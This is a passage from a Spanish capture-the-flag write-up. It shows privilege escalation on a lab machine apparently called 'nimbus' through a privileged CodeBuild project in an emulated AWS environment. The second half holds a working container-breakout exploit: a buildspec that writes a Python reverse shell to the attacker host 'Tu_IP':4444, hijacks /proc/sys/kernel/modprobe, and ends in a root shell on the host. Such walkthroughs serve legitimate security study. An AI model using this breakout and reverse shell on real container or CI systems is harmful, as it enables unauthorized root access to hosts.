{"edition":"community","services":{"ssm":"running","sqs":"running","s3":"running","dynamodb":"running","sns":"running","lambda":"running","apigateway":"running","iam":"running","kafka":"running","elasticache":"running","rds":"running","neptune":"running","events":"running","scheduler":"running","logs":"running","monitoring":"running","secretsmanager":"running","apigatewayv2":"running","kinesis":"running","kms":"running","cognito-idp":"running","states":"running","cloudformation":"running","acm":"running","athena":"running","glue":"running","firehose":"running","email":"running","es":"running","ec2":"running","ecs":"running","appconfig":"running","appconfigdata":"running","ecr":"running","tagging":"running","bedrock-runtime":"running","eks":"running","pipes":"running","elasticloadbalancing":"running","codebuild":"running","codedeploy":"running","autoscaling":"running","backup":"running","transfer":"running","route53":"running","textract":"running","pricing":"running","transcribe":"running","ce":"running","cur":"running","bcm-data-exports":"running"},"version":"1.5.17","original_edition":"floci-always-free"}
```

De igual forma, podemos ejecutar **linpeas.sh**, pues puede que encuentre algo útil para escalar:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Una vez que lo tengas, podemos enviarlo al contenedor utilizando un servidor de **Python3** y descargándolo con **Python3**:
```bash
worker@044f4a8b56ae:~$ python3 -c 'import urllib.request;urllib.request.urlretrieve("http://Tu_IP:8000/linpeas.sh", "linpeas.sh")'
```

Al ejecutarlo, podremos ver lo siguiente:
```bash
══╣ Breakout via mounts
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html
═╣ /proc mounted? ................. Yes
```
Gracias a que tenemos el directorio `/proc`, puede que tengamos una forma de escalar privilegios, siendo un **Docker Breakout**.

Una de ellas que parece aplicar es la siguiente:
* <a href="https://kubehound.io/reference/attacks/CE_UMH_CORE_PATTERN/" target="_blank">kubehound: CE_UMH_CORE_PATTERN</a>

El problema es que, para que se pueda aplicar esta vulnerabilidad, tendríamos que tener permisos de escritura sobre el archivo `/proc/sys/kernel/core_pattern`, pero en nuestro caso no tenemos:
```bash
worker@044f4a8b56ae:~$ ls -la /proc/sys/kernel/core_pattern
-rw-r--r-- 1 root root 0 Jul  1 16:52 /proc/sys/kernel/core_patter
```
Sin embargo, al ver que tenemos permisos para crear proyectos con **CodeBuild**, es posible crear un proyecto para ejecutar comandos, incluso como **Root** usando la flag `privilegedMode=True`.

### Aplicando Docker Breakout Utilizando Proyecto Privilegiado de CodeBuild para LocalStack AWS {#privesc}

Podemos seguir enumerando que acciones podemos hacer con **CodeBuild**, puedes utilizar el siguiente blog:
* <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-codebuild-enum.html" target="_blank">Cloud HackTricks: AWS - Codebuild Enum</a>

También los siguientes blogs explican cómo crear un proyecto con **CodeBuild**:
* <a href="https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc/index.html" target="_blank">Cloud HackTricks: AWS - Codebuild Privesc</a>
* <a href="https://docs.aws.amazon.com/codebuild/latest/userguide/create-project.html" target="_blank">Create a build project in AWS CodeBuild</a>

Igual para crear un proyecto que ejecute comandos, me apoyé con **ChatGPT, Google AI** y algunas pistas que se me compartieron, obteniendo el siguiente resultado:
```bash
cat proyectoTest.json
{
  "name": "testing",
  "source": {
    "type": "NO_SOURCE",
    "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - RES_ID=$(id) && RES_WHO=$(whoami) && echo \"RESULTADO:[$RES_ID | $RES_WHO]\" && exit 1\n"
  },
  "artifacts": {
    "type": "NO_ARTIFACTS"
  },
  "environment": {
    "type": "LINUX_CONTAINER",
    "image": "floci/floci:latest",
    "computeType": "BUILD_GENERAL1_SMALL",
    "privilegedMode": true,
    "environmentVariables": [
      {
        "name": "BASH_FUNC_id%%",
        "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
        "type": "PLAINTEXT"
      }
    ]
  },
  "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
}
```

Expliquemos qué hace este archivo **JSON**:
* En la sección de **source** especificamos el código que se va a ejecutar, siendo en el atributo **BuildSpec**.
* **BuildSpec** debe estar indentado como un archivo **YAML** para que se puedan leer sus instrucciones correctamente.
* Los comandos a ejecutar son **id** y **whoami**; los resultados se guardan en dos variables, el resultado final se muestra en un **echo** y se provoca un error intencional con `exit 1`, esto último para poder visualizar la ejecución de los comandos al revisar los logs del proyecto.
* En el atributo de **environment**, utilizamos **Linux** como contenedor y se utiliza la imagen de **Docker** para ejecutar el **BuildSpec**.
* La parte más importante es indicar que se use el **privilegedMode** como **true**, esto para que se ejecuten los comandos con altos privilegios.
* Al definir el contenido del atributo **environmentVariables**, definimos una variable de entorno llamada `BASH_FUNC_id%%` que esta intenta redefinir el comportamiento del comando **id** cuando el entorno utiliza **Bash** e importa funciones exportadas. La idea es que sirva como una comprobación del entorno de ejecución o como una demostración del mecanismo de funciones exportadas de **Bash**.
* Al final, definimos el atributo **serviceRole**, que este contiene el rol **IAM** que usaría **CodeBuild**. (En **LocalStack** suele ser un **ARN** ficticio).

Cárgalo al contenedor, crea e inicia el proyecto utilizando **CodeBuild**:
```bash
worker@044f4a8b56ae:~$ python3 -c 'import urllib.request;urllib.request.urlretrieve("http://Tu_IP:8000/proyectoTest.json", "proyectoTest.json")'
worker@044f4a8b56ae:~$ aws codebuild create-project --cli-input-json file://proyectoTest.json --endpoint-url http://floci:4566
worker@044f4a8b56ae:~$ aws codebuild start-build --project-name testing --endpoint-url http://floci:4566
```

Ahora, podemos ver los detalles de la creación de un proyecto usando la función **batch-get-builds**:
```bash
worker@044f4a8b56ae:~$ aws codebuild batch-get-builds --ids testing:1 --endpoint-url http://floci:4566
{
    "builds": [
        {
            "id": "testing:1",
            "arn": "arn:aws:codebuild:us-east-1:847219365028:build/testing:1",
            "buildNumber": 1,
            "startTime": "2026-07-02T06:51:44.672000+00:00",
            "endTime": "2026-07-02T06:51:45.238000+00:00",
            "currentPhase": "COMPLETED",
            "buildStatus": "FAILED",
            "projectName": "testing",
            "phases": [
                {
                    "phaseType": "SUBMITTED",
                    "phaseStatus": "SUCCEEDED",
...
...
...
                    "contexts": [
                        {
                            "statusCode": "COMMAND_EXECUTION_ERROR",
                            "message": "Exit code 1: RESULTADO:[uid=0(root) gid=0(root) groups=0(root) | root]"
                        }
                    ]
                },
                    {
                        "name": "BASH_FUNC_id%%",
                        "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
                        "type": "PLAINTEXT"
                    }
                ],
                "privilegedMode": true
            },
            "logs": {
                "groupName": "/aws/codebuild/testing",
                "streamName": "2026/07/02/testing/1",
                "cloudWatchLogsArn": "arn:aws:logs:us-east-1:847219365028:log-group:/aws/codebuild/testing:log-stream:2026/07/02/testing/1"
            },
            "timeoutInMinutes": 60,
            "queuedTimeoutInMinutes": 480,
            "buildComplete": true,
            "initiator": "user"
        }
    ],
    "buildsNotFound": []
}
```
Observa que se ejecutaron los comandos **id** y **whoami**, justo como lo indicamos.

Esto nos indica que podemos ejecutar comandos como **Root**, por lo que podemos crear un proyecto que nos permita obtener una **Reverse Shell** de la máquina host, siendo este el resultado:
```bash
cat privesc.json
{
  "name": "nimbus-exploit",
  "source": {
    "type": "NO_SOURCE",
    "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - cat /proc/self/status | grep Cap\n      - |\n        cat > /tmp/payload.sh << 'PYEOF'\n        #!/bin/sh\n        python3 -c '\n        import socket,os,pty\n        s=socket.socket()\n        s.connect((\"Tu_IP\",4444))\n        os.dup2(s.fileno(),0)\n        os.dup2(s.fileno(),1)\n        os.dup2(s.fileno(),2)\n        pty.spawn(\"/bin/bash\")\n        '\n        PYEOF\n      - chmod +x /tmp/payload.sh\n      - |\n        upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)\n        echo \"$upper/tmp/payload.sh\" > /proc/sys/kernel/modprobe\n      - printf '\\xff\\xff\\xff\\xff' > /tmp/x\n      - chmod +x /tmp/x\n      - /tmp/x || true\n"
  },
  "artifacts": {
    "type": "NO_ARTIFACTS"
  },
  "environment": {
    "type": "LINUX_CONTAINER",
    "image": "floci/floci:latest",
    "computeType": "BUILD_GENERAL1_SMALL",
    "privilegedMode": true,
    "environmentVariables": [
      {
        "name": "BASH_FUNC_id%%",
        "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
        "type": "PLAINTEXT"
      }
    ]
  },
  "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
}
```

Expliquemos este archivo **JSON**:
* La diferencia con el proyecto anterior es que las instrucciones que carga el **BuildSpec** serán una **Reverse Shell** y se cambia el nombre del proyecto por **nimbus-exploit**.
* Para que la **Reverse Shell** funcione, se aplica un **Docker Breakout** abusando de **modprobe**, muy similar a abusar de **core_pattern** siendo que solo se cambia de archivo a explotar.
* Se carga como payload la **Reverse Shell** en **Python** dentro de un script de **Bash** que se crea en el directorio `/tmp`, luego se le dan permisos de ejecución y se inyecta la ruta donde se ubica este script dentro de `/proc/sys/kernel/modprobe`, siendo así que se ejecutará el script.
* Para que **modprobe** ejecute nuestro script, se crea un archivo que contiene cuatro **bytes 0xFF** (esta instrucción: `printf '\xff\xff\xff\xff'`), se le da permisos de ejecución y se hace un intento para correrlo, pero también se agrega **true** para que, en caso de que falle, no se detenga la ejecución del proyecto. La idea es que, al ejecutar un archivo con un formato desconocido, hace que el kernel intente determinar cómo manejarlo, siendo este comportamiento el que nos permite provocar una llamada al mecanismo relacionado con **modprobe**, logrando así la ejecución de nuestro script.

Cárgalo al contenedor y crea el proyecto utilizando **CodeBuild**:
```bash
worker@044f4a8b56ae:~$ python3 -c 'import urllib.request;urllib.request.urlretrieve("http://Tu_IP:8000/privesc.json", "privesc.json")'
worker@044f4a8b56ae:~$ aws codebuild create-project --cli-input-json file://privesc.json --endpoint-url http://floci:4566
```

Antes de iniciarlo, levanta un listener con **netcat**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
```

Inicia el proyecto:
```bash
worker@044f4a8b56ae:~$ aws codebuild start-build --project-name nimbus-exploit --endpoint-url http://floci:4566
```

Si vemos los detalles del proyecto, veremos que se encuentra en ejecución:
```bash
worker@044f4a8b56ae:~$ aws codebuild batch-get-builds --ids nimbus-exploit:1 --endpoint-url http://floci:4566
{
    "builds": [
        {
            "id": "nimbus-exploit:1",
            "arn": "arn:aws:codebuild:us-east-1:847219365028:build/nimbus-exploit3:1",
            "buildNumber": 1,
            "startTime": "2026-07-01T23:04:24.204000+00:00",
            "currentPhase": "BUILD",
            "buildStatus": "IN_PROGRESS",
            "projectName": "nimbus-exploit",
            "phases": [
                {
                    "phaseType": "SUBMITTED",
                    "phaseStatus": "SUCCEEDED",
...
...
...
```

Y si revisamos la **netcat**, vemos que estamos dentro de la máquina host como **Root**:
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.245.218] 56266
root@nimbus:/# whoami
whoami
root
```

Obtengamos la última flag:
```bash
root@nimbus:/home/marcus# cd /root
cd /root
root@nimbus:/root# cat root.txt
cat root.txt
...
```
Y con esto, terminamos la máquina.
